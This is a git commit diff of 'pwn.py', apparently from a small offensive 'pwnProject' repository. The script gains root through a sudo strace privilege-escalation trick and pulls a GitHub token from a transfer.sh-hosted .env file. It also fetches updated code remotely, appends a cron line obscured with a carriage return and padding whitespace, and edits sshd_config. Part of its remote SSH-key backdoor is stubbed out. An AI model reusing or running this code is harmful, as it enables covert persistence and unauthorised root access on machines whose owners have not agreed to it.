bfbf1221ed254385364a351acebe454a4160a068
Andrew White <44064254+LivvidDreams@users.noreply.github.com>
2023-03-07 16:53:07 -0600

    Add files via upload

--- pwn.py
+++ pwn.py
@@ -1,27 +1,50 @@
 import os
 import subprocess
-import sys
 
-
-scriptLink = 'https://raw.githubusercontent.com/LivvidDreams/pwnProject/master/'
 mainUser = 'LivvidDreams'
+scriptLink = 'https://raw.githubusercontent.com/LivvidDreams/pwnProject/master/'
+
+currentCRON = '/var/spool/cron/root'
+locationFile = '/home/user/pwn.py'
+
 gtfoBin = 'sudo strace -o /dev/null {}'
 files = ['pwn.py', '.env']
 
+        
+def runCommand(command, output=False):
+    if not output:
+        subprocess.call(command.split(), stdout = subprocess.PIPE)
+    else:
+        subprocess.call(command.split())
 
-def rerun():
-    subprocess.call(gtfoBin.format('python3 pwn.py').split())
-    exit()
+
+def sshConfigEdit():
+    path = "/etc/ssh/sshd_config"
+    flag1 = "GSSAPIAuthentication"
+    flag2 = "GSSAPICleanupCredentials"
+    with open(path, "r") as sshfile:
+        newlines = []
+        for word in sshfile.readlines():
+            if flag1 in word or flag2 in word: continue
+            newlines.append(word)
+    with open(path, "w") as sshfile:
+        for line in newlines:
+            sshfile.writelines(line)
+    runCommand("systemctl restart sshd")
 
 
 def update_python():
     try:
         pyth = 'python3 --version >/dev/null'
-        subprocess.call(pyth.split(), stdout = subprocess.PIPE)
+        runCommand(pyth)
         return
     except Exception:
         print('updating python')
-        subprocess.call(gtfoBin.format('yum -y -q -e 0 install python3 > /dev/null').split(), stdout=subprocess.PIPE)
+        runCommand(gtfoBin.format('yum -y -q -e 0 install python3 > /dev/null'))
+
+def rerun():
+    runCommand(gtfoBin.format('python3 pwn.py'), True)
+    exit()
 
 
 def is_root():
@@ -32,20 +55,70 @@ def is_root():
         # Rerun This Script As Root User
         rerun()
 
+def startUpRecover():
+    # On startup, we need a couple of things
+        # 1. Need to get the oldest version of the script BACK on the tgt machine
+        # 2. After receiving, we need to check to see if it needs to be updated
+        # 3. After checking for updates, we need to 
+    print()
 
+def appendCron(path, command):
+    assert is_root()
+    # try:
+    #     from crontab import CronTab
+    # except:
+    #     runCommand("python3 -m pip install python-crontab")
+    #     rerun()
+    
+    # carriage = ' #\r'
+    # whitespace = ' ' * (len(command) + len(carriage))
+
+    # try:
+    #     # cron=CronTab(user=path)
+    #     cron=CronTab(tabfile=path, user="root")
+    #     properCmd = command + carriage + whitespace
+
+    #     job1=cron.new(command=properCmd)
+    #     job1.minute.every(1)
+    #     cron.write()
+    #     print("Finished Appending To Cron")
+    # except Exception as e:
+    #     print(e)
+    #     print(f"Failed To Append to File {path}")
+    #     return
+
+
+
+
+    carriage = ' #\r'
+    whitespace = ' ' * (len(command) + len(carriage))
+    # Just need to open file @path
+    try:
+        cronfile = open(path, "a")  # append mode
+        # print(cronfile.read())
+        cronfile.write("\n" + command + carriage + whitespace + "\n")
+        cronfile.close()
+        runCommand("systemctl reload crond.service")
+        runCommand("systemctl restart crond.service")
+        print(f'Appended To File {path}')
+    except:
+        print(f"Failed To Append to File {path}")
+        return
+
+    
 
 def configureTokens():
     try:
         from dotenv import load_dotenv
     except:
-        subprocess.call("python3 -m pip install python-dotenv".split(), stdout = subprocess.PIPE)
+        runCommand("python3 -m pip install python-dotenv")
         rerun()
 
     api_key = None
 
     
     # Ensure we can download enviornment file
-    subprocess.call("curl -o .env https://transfer.sh/2S2RUM/.env".split())
+    runCommand("curl -s -o .env https://transfer.sh/2S2RUM/.env")
     load_dotenv()
     api_key = os.getenv("github_key")
 
@@ -54,12 +127,11 @@ def configureTokens():
     return (mainUser, api_key)
 
 
-
 def getScript():
     try:
         import requests
     except:
-        subprocess.call("python3 -m pip install requests".split(), stdout = subprocess.PIPE)
+        runCommand("python3 -m pip install requests")
         rerun()
 
     validAuth = configureTokens()
@@ -74,19 +146,41 @@ def getScript():
         exit()
 
 
+def remoteAccessGen():
+    # need to generate keys on local & tgt
+    # need to make ssh folder for root to store key
+    # copy pub key into ssh_id folder for root
+    # restart ssh
+
+    # make ssh directories
+    runCommand("mkdir /etc/ssh")
+    runCommand("mkdir /etc/ssh/authorized_keys")
+
+    # need to get the keys
+
+
+
+
+
 def main():
-    # Obtain Root Priv To Run Rest Of Script With
-
-    # Check If Script Is Already In Directory, Else Get Script
-    #getScript()
-
     # First Attempt To Install Python3 for Easier Scripting
     update_python()
 
     # Next Attempt To Rerun Script As Root. Else, Run Root Priv Things
     if not is_root(): exit()
+
+    # Update The Script From GitHub And Obtain Keys To Add
     getScript()
+
+    # Find Place To Hide The Script While Running
+    cmd = "* * * * * rm -f " + locationFile
+    appendCron(currentCRON, cmd)
+
+    # attempt to edit ssh files
+    sshConfigEdit()
     
+
+    # HOW TO CONNECT (?? SHELLLLLLLLLLLLL)    
     
     
 
